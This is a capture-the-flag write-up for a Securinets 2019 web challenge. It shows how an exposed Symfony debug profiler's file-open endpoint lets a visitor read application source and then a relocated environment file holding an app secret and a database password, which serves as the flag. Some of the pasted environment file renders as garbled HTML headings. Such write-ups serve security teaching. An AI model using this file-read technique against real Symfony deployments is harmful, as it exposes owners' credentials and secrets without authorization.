<h1>Securinets Prequals CTF 2019 â€“ Custom Location</h1>

<ul>
<li><strong>Category:</strong> Web</li>
<li><strong>Points:</strong> 964</li>
</ul>

<h2>Challenge</h2>

<blockquote>
  <p>Try to find out the database credentials.</p>
  
  <p>The author changed the location of some files to protect the web application from script kiddies.</p>
  
  <p>https://web0.ctfsecurinets.com/</p>
  
  <p>Author:TheEmperors</p>
</blockquote>

<h2>Solution</h2>

<p>Trying to reach pages (e.g. <code>https://web0.ctfsecurinets.com/foo.php</code>) will trigger Symfony error pages. From these pages it is possible to access to the Symfony profiler interface.</p>

<p>Analyzing one of the results (<code>https://web0.ctfsecurinets.com/_profiler/open?file=public/index.php&amp;line=27#line27</code>)</p>

<p><code>php
&lt;?php
use App\Kernel;
use Symfony\Component\Debug\Debug;
use Symfony\Component\HttpFoundation\Request;
require dirname(__DIR__).'/config/bootstrap.php';
if ($_SERVER['APP_DEBUG']) {
    umask(0000);
    Debug::enable();
}
if ($trustedProxies = $_SERVER['TRUSTED_PROXIES'] ?? $_ENV['TRUSTED_PROXIES'] ?? false) {
    Request::setTrustedProxies(explode(',', $trustedProxies), Request::HEADER_X_FORWARDED_ALL ^ Request::HEADER_X_FORWARDED_HOST);
}
Request::setTrustedProxies(['127.0.0.1/8','::1', '172.17.0.0/16','192.0.0.1', '10.0.0.0/8'], Request::HEADER_X_FORWARDED_ALL);
if ($trustedHosts = $_SERVER['TRUSTED_HOSTS'] ?? $_ENV['TRUSTED_HOSTS'] ?? false) {
    Request::setTrustedHosts([$trustedHosts]);
}
$kernel = new Kernel($_SERVER['APP_ENV'], (bool) $_SERVER['APP_DEBUG']);
$request = Request::createFromGlobals();
$response = $kernel-&gt;handle($request);
$response-&gt;send();
$kernel-&gt;terminate($request, $response);
</code></p>

<p>an interesting file can be found: <code>require dirname(__DIR__).'/config/bootstrap.php';</code>.</p>

<p>Connecting to it (<code>https://web0.ctfsecurinets.com/_profiler/open?file=config/bootstrap.php</code>), you can find the complete path to the environment file.</p>

<p><code>php
&lt;?php
use Symfony\Component\Dotenv\Dotenv;
require dirname(__DIR__).'/vendor/autoload.php';
// Load cached env vars if the .env.local.php file exists
// Run "composer dump-env prod" to create it (requires symfony/flex &gt;=1.2)
if (is_array($env = @include dirname(__DIR__).'/.env.local.php')) {
    $_SERVER += $env;
    $_ENV += $env;
} elseif (!class_exists(Dotenv::class)) {
    throw new RuntimeException('Please run "composer require symfony/dotenv" to load the ".env" files configuring the application.');
} else {
    // load all the .env files
    (new Dotenv())-&gt;loadEnv(dirname(__DIR__).'/secret_ctf_location/env');
}
$_SERVER['APP_ENV'] = $_ENV['APP_ENV'] = ($_SERVER['APP_ENV'] ?? $_ENV['APP_ENV'] ?? null) ?: 'dev';
$_SERVER['APP_DEBUG'] = $_SERVER['APP_DEBUG'] ?? $_ENV['APP_DEBUG'] ?? 'prod' !== $_SERVER['APP_ENV'];
$_SERVER['APP_DEBUG'] = $_ENV['APP_DEBUG'] = (int) $_SERVER['APP_DEBUG'] || filter_var($_SERVER['APP_DEBUG'], FILTER_VALIDATE_BOOLEAN) ? '1' : '0';
</code></p>

<p>You can print the content of the environment file with <code>https://web0.ctfsecurinets.com/_profiler/open?file=/secret_ctf_location/env</code>.</p>

<p>Into the environment file you can find the flag.</p>

<p>```</p>

<h1>In all environments, the following files are loaded if they exist,</h1>

<h1>the later taking precedence over the former:</h1>

<p>#</p>

<h1>* .env                contains default values for the environment variables needed by the app</h1>

<h1>* .env.local          uncommitted file with local overrides</h1>

<h1>* .env.$APP_ENV       committed environment-specific defaults</h1>

<h1>* .env.$APP_ENV.local uncommitted environment-specific overrides</h1>

<p>#</p>

<h1>Real environment variables win over .env files.</h1>

<p>#</p>

<h1>DO NOT DEFINE PRODUCTION SECRETS IN THIS FILE NOR IN ANY OTHER COMMITTED FILES.</h1>

<p>#</p>

<h1>Run "composer dump-env prod" to compile .env files for production use (requires symfony/flex &gt;=1.2).</h1>

<h1>https://symfony.com/doc/current/best_practices/configuration.html#infrastructure-related-configuration</h1>

<h3>&gt; symfony/framework-bundle</h3>

<p>APP<em>ENV=dev
APP</em>SECRET=44705a2f4fc85d70df5403ac8c7649fd</p>

<h1>TRUSTED_PROXIES=127.0.0.1,127.0.0.2</h1>

<h1>TRUSTED_HOSTS='^localhost|example.com$'</h1>

<h3>&lt; symfony/framework-bundle</h3>

<h3>&gt; doctrine/doctrine-bundle</h3>

<h1>Format described at http://docs.doctrine-project.org/projects/doctrine-dbal/en/latest/reference/configuration.html#connecting-using-a-url</h1>

<h1>For an SQLite database, use: "sqlite:///%kernel.project_dir%/var/data.db"</h1>

<h1>Configure your db driver and server_version in config/packages/doctrine.yaml</h1>

<p>DATABASE<em>URL=mysql://symfony</em>admin:Securinets{D4taB4se<em>P4sSw0Rd</em>My5qL<em>St0L3n}@127.0.0.1:3306/symfony</em>task</p>

<h3>&lt; doctrine/doctrine-bundle</h3>

<h3>&gt; symfony/swiftmailer-bundle</h3>

<h1>For Gmail as a transport, use: "gmail://username:password@localhost"</h1>

<h1>For a generic SMTP server, use: "smtp://localhost:25?encryption=&amp;auth_mode="</h1>

<h1>Delivery is disabled by default via "null://localhost"</h1>

<p>MAILER_URL=null://localhost</p>

<h3>&lt; symfony/swiftmailer-bundle</h3>

<p>```</p>

<p>The flag is the following.</p>

<p><code>
Securinets{D4taB4se_P4sSw0Rd_My5qL_St0L3n}
</code></p>
